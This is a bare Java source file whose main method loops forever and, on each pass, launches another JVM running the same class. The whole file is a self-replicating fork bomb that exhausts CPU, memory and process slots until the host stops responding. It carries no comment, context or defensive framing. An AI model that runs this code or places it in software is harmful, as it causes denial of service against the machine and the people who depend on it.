public class Main
{
    public static void main(String[] args) throws Exception
    {
        while (true)
        {
            Runtime.getRuntime().exec("java Main");
        }
    }
}
